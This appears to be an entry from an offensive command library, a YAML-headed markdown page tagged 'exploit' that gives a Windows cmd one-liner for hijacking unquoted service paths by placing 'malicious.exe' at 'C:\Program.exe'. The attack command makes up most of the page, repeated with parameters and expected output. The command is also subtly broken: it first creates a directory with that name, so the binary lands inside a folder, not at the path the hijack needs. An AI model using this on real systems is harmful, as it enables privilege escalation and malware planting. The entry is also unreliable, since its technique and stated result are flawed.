---
data: 'mkdir "C:\Program.exe" 2>nul && copy \path\to\malicious.exe "C:\Program.exe"'
tags:
  - file-copy
  - exploit
type: command
output: Directory created and file copied
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.137Z'
id: 05d075d5-fe43-4a9d-ad3c-4baeb1e9aef0
verified: false
validated: true
submitted: true
---
# create-directory-and-copy-binary

## Command

```cmd
mkdir "C:\Program.exe" 2>nul && copy \path\to\malicious.exe "C:\Program.exe"
```

## Description

Creates a hijack directory and copies a malicious binary to exploit unquoted paths.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| mkdir | Create directory | Yes |
| copy | Copy file | Yes |

## Examples

### Basic Usage

```cmd
mkdir "C:\Program.exe" 2>nul && copy malicious.exe "C:\Program.exe"
```

## Expected Output

`1 file(s) copied.` with no mkdir errors.

## Related

- [[Related Procedure: Exploit-Unquoted-Service-Path-with-Malicious-Binary]]
